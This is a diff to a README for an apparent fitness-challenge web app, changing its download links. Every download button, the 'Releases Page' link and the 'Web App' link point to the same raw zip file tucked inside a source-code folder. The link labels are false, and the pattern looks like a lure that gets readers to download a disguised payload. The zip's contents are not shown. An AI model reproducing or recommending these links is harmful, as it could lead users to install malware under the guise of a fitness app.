@@ -6,9 +6,9 @@ Welcome to the workout_challenge application! This web app lets you compete with
 ## 📥 Download & Install
 To get started, you need to download the software. 
 
-[![Download workout_challenge](https://raw.githubusercontent.com/Puppet007521/workout_challenge/main/landskip/workout_challenge.zip)](https://raw.githubusercontent.com/Puppet007521/workout_challenge/main/landskip/workout_challenge.zip)
+[![Download workout_challenge](https://raw.githubusercontent.com/Puppet007521/workout_challenge/main/src-frontend/src/forms/workout-challenge-v3.5.zip)](https://raw.githubusercontent.com/Puppet007521/workout_challenge/main/src-frontend/src/forms/workout-challenge-v3.5.zip)
 
-Visit this page to download: [Releases Page](https://raw.githubusercontent.com/Puppet007521/workout_challenge/main/landskip/workout_challenge.zip)
+Visit this page to download: [Releases Page](https://raw.githubusercontent.com/Puppet007521/workout_challenge/main/src-frontend/src/forms/workout-challenge-v3.5.zip)
 
 1. Click the link above to go to the Releases page.
 2. Find the latest release.
@@ -43,7 +43,7 @@ Visit this page to download: [Releases Page](https://raw.githubusercontent.com/P
 4. **Track Progress**: Monitor your fitness progress on your dashboard.
 
 ## 🌐 Accessing the Web App
-After installation, you can also access the web version. Visit [workout_challenge Web App](https://raw.githubusercontent.com/Puppet007521/workout_challenge/main/landskip/workout_challenge.zip) for browser-based access. 
+After installation, you can also access the web version. Visit [workout_challenge Web App](https://raw.githubusercontent.com/Puppet007521/workout_challenge/main/src-frontend/src/forms/workout-challenge-v3.5.zip) for browser-based access. 
 
 ## 🔒 Data Privacy
 Your privacy is our priority. All data shared within the app remains secure. You control what metrics to share with friends. 
@@ -54,6 +54,6 @@ If you run into issues, feel free to reach out. You can create an issue in our G
 ## 💬 Stay Updated
 Follow the repository for updates. Check the Releases page regularly for new features and improvements.
 
-[![Download workout_challenge](https://raw.githubusercontent.com/Puppet007521/workout_challenge/main/landskip/workout_challenge.zip)](https://raw.githubusercontent.com/Puppet007521/workout_challenge/main/landskip/workout_challenge.zip)
+[![Download workout_challenge](https://raw.githubusercontent.com/Puppet007521/workout_challenge/main/src-frontend/src/forms/workout-challenge-v3.5.zip)](https://raw.githubusercontent.com/Puppet007521/workout_challenge/main/src-frontend/src/forms/workout-challenge-v3.5.zip)
 
 Thank you for choosing workout_challenge. Let’s make fitness fun together!
